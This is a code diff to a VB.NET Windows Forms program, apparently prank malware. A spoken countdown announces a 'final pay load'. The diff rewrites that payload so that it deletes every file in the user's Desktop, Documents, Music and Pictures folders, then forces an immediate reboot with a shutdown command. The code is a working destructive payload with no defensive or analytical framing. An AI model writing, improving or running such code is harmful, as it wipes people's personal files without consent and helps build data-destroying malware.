@@ -258,7 +258,6 @@ Public Class Form1
         Timer11.Stop()
         Timer12.Stop()
         Timer13.Stop()
-        Timer16.Stop()
         Me.BackColor = Color.Black
         Me.BackgroundImage = Nothing
         My.Computer.Audio.Stop()
@@ -275,19 +274,24 @@ Public Class Form1
         time -= 10
         If time = 0 Then
             tts.speak("Your personal files will now be cleaned up. Also known as deleted")
-            IO.Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures))
-            IO.Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos))
-            IO.Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory))
+            For Each file As String In IO.Directory.GetFiles(FileIO.SpecialDirectories.Desktop)
+                IO.File.Delete(file)
+            Next
+            For Each file As String In IO.Directory.GetFiles(FileIO.SpecialDirectories.MyDocuments)
+                IO.File.Delete(file)
+            Next
+            For Each file As String In IO.Directory.GetFiles(FileIO.SpecialDirectories.MyMusic)
+                IO.File.Delete(file)
+            Next
+            For Each file As String In IO.Directory.GetFiles(FileIO.SpecialDirectories.MyPictures)
+                IO.File.Delete(file)
+            Next
             tts.speak("It is now done, have a great time.")
             Process.Start("shutdown", "-r -t 00")
             Timer15.Stop()
         Else
             tts.speak("You have " & time & " seconds left until i activate the final pay load.")
         End If
-
-    End Sub
-
-    Private Sub Timer16_Tick(sender As Object, e As EventArgs) Handles Timer16.Tick
 
     End Sub
 End Class
